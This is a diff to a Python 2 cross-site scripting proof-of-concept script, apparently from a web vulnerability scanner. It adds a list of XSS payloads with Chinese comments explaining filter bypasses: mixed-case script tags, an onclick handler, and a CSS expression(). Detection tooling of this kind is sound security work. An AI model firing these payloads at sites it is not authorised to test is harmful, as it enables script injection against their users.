@@ -7,10 +7,20 @@
 # @Software: PyCharm
 
 from tool.poc_tool import PocTool as tool
+import random
 from log.log_console import LogConsole as logs
 import sys
 reload(sys)
 sys.setdefaultencoding('utf-8')
+
+XSS_CODE = random.randint(1, 100)
+
+# 如果被过滤，尝试以下的绕过方法
+XSS_POC = [
+    '<ScRipt>alert({0});</ScRipt>',                     # 过滤小写script,采用大小写混合
+    '<div onclick="alert({0})">',                       # 过滤大小写,采用DOM
+    '<div style="color: expression(alert({0}))">'    # 行内样式
+]
 
 def poc(url=''):
     '''
@@ -47,7 +57,10 @@ def CLI():
     import sys
     if len(sys.argv) != 3:
         print("[*] poc_xss.py <url>")
-    url = sys.argv[1]
-    print('[*] 跨站脚本 - Cross Site Scripting')
-    print poc(url=url)
+    else:
+        url = sys.argv[1]
+        print('[*] 跨站脚本 - Cross Site Scripting')
+        print poc(url=url)
 
+if __name__ == '__main__':
+    CLI()
